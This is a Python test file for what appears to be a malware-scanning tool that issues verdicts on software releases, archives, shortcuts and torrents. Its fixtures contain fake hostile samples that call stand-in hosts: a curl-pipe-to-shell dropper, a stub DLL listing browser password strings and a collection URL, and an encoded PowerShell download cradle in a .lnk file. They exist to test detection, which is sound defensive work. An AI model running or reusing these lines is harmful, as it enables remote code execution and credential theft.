import io, json, os, struct, sys, zipfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from event_zero.verdict import verdict, verdict_to_manifest_jsonl, parse_torrent, bdecode

def write(tmp, name, data, sub=""):
    d = os.path.join(str(tmp), sub) if sub else str(tmp)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, name)
    # newline="" for text writes: byte-exact fixtures on every platform
    # (Windows text mode would otherwise write CRLF and change hashes).
    with open(p, "wb" if isinstance(data, bytes) else "w", newline=None if isinstance(data, bytes) else "") as f:
        f.write(data)
    return p

def pe_with_body(body, extra_strings=b""):
    dos = bytearray(0x80); dos[0:2] = b"MZ"; struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 240, 0x22)
    opt = bytearray(240); struct.pack_into("<H", opt, 0, 0x20b); struct.pack_into("<I", opt, 16, 0x1000)
    sec = bytearray(40); sec[0:5] = b".text"; struct.pack_into("<IIII", sec, 8, 100, 0x1000, 512, 512)
    b = (body + extra_strings).ljust(512, b"\x00")
    return bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(sec) + b

KEYGEN_CLEAN = 'import hashlib, random\n# keygen: generate a serial key\ndef make_key():\n    return "KEY-" + hashlib.md5(str(random.randint(1, 9999)).encode()).hexdigest()[:8].upper()\nprint("serial:", make_key())\n'
DROPPER = 'import os\nos.system("curl http://drop.example/payload.sh | sh")\n'
STEALER_DLL = pe_with_body(b"\x90" * 8, b"Login Data\x00password\x00http://steal.example/collect\x00")

# 1. folder with one dirty file inherits YES-PROVEN
def test_folder_inherits_yes_from_one_dirty_file(tmp_path):
    rel = os.path.join(str(tmp_path), "release"); os.makedirs(rel)
    write(tmp_path, "keygen.py", KEYGEN_CLEAN, "release")
    write(tmp_path, "notes.txt", "a perfectly ordinary readme", "release")
    write(tmp_path, "setup.py", DROPPER, "release")
    v = verdict(rel)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    per = {f["path_in_release"]: f["verdict"] for f in v["files"]}
    assert per["setup.py"].startswith("YES: MALWARE")
    assert per["keygen.py"] == "NO: ACCOUNTED"

# 2. archive inside archive: payload at the bottom is found
def test_archive_inside_archive_payload_found(tmp_path):
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as z:
        z.writestr("helper.dll", STEALER_DLL)
    outer = os.path.join(str(tmp_path), "release.zip")
    with zipfile.ZipFile(outer, "w") as z:
        z.writestr("readme.txt", "nested release")
        z.writestr("inner.zip", inner.getvalue())
    v = verdict(outer)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    paths = [f["path_in_release"] for f in v["files"]]
    assert any("inner.zip!" in p and "helper.dll" in p for p in paths), paths
    man = verdict_to_manifest_jsonl(v)
    lines = [json.loads(x) for x in man.splitlines()]
    assert lines[0]["type"] == "header" and lines[0]["schema"] == "eventzero.manifest/1"
    assert lines[-1]["type"] == "footer" and lines[-1]["tree_sha256"]
    nested = [e for e in lines if e.get("path", "").count("!") >= 1 and "helper.dll" in e.get("path", "")]
    assert nested and nested[0]["parent_id"], "nested entry must carry its container parent"

# 3. .url and .lnk entries appear in the connection ledger; the .lnk is a dropper
def test_url_and_lnk_ledger_entries(tmp_path):
    rel = os.path.join(str(tmp_path), "release"); os.makedirs(rel)
    write(tmp_path, "download.url", "[InternetShortcut]\nURL=https://bit.ly/3abcExample\n", "release")
    lnk_body = b"\x4c\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 64 + "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc aHR0cDovL2V2aWwuZXhhbXBsZS9w".encode("utf-16-le") + b"\x00" * 8 + b"http://evil.example/payload"
    write(tmp_path, "Play Game.lnk", lnk_body, "release")
    write(tmp_path, "keygen.py", KEYGEN_CLEAN, "release")
    v = verdict(rel)
    ledger = v["connection_ledger"]
    assert any(le["source_file"].endswith(".url") for le in ledger), ledger
    assert any(le["classification"] == "shortener" for le in ledger), ledger
    assert any(le["source_file"].endswith(".lnk") for le in ledger), ledger
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert any(y["chain"] == "lnk-download-cradle" for y in v["yes_reasons"]), [y["chain"] for y in v["yes_reasons"]]

# 4. torrent parsed locally into the ledger, swarm never joined
def test_torrent_ledger_entries(tmp_path):
    def benc(x):
        if isinstance(x, int):
            return b"i" + str(x).encode() + b"e"
        if isinstance(x, bytes):
            return str(len(x)).encode() + b":" + x
        if isinstance(x, str):
            return benc(x.encode())
        if isinstance(x, list):
            return b"l" + b"".join(benc(i) for i in x) + b"e"
        if isinstance(x, dict):
            items = sorted(x.items(), key=lambda kv: kv[0] if isinstance(kv[0], bytes) else kv[0].encode())
            return b"d" + b"".join(benc(k if isinstance(k, bytes) else k.encode()) + benc(val) for k, val in items) + b"e"
        raise TypeError(x)
    meta = {b"announce": b"udp://tracker.example.org:1337/announce",
            b"info": {b"name": b"game", b"files": [{b"path": [b"game.py"], b"length": 10}]}}
    p = write(tmp_path, "release.torrent", benc(meta))
    v = verdict(p)
    tor = v["files"][0].get("torrent")
    assert tor and tor["parsed"] and tor["trackers"], tor
    assert any("tracker" in (le.get("note") or "") for le in v["connection_ledger"])

# 5. manifest JSONL: header, entries, footer tree hash, inheritance fields
def test_manifest_jsonl_shape(tmp_path):
    rel = os.path.join(str(tmp_path), "release"); os.makedirs(rel)
    write(tmp_path, "keygen.py", KEYGEN_CLEAN, "release")
    v = verdict(rel)
    lines = [json.loads(x) for x in verdict_to_manifest_jsonl(v).splitlines()]
    assert lines[0]["type"] == "header"
    assert lines[-1]["type"] == "footer"
    assert lines[-1]["tree_sha256"] == v["manifest"]["tree_sha256"]
    assert lines[-1]["verdict"] == "NO"
    entry = [e for e in lines if e["type"] == "entry"][0]
    assert entry["streams"] and entry["streams"][0]["name"] == "$DATA"
    assert entry["coverage"] == "full"
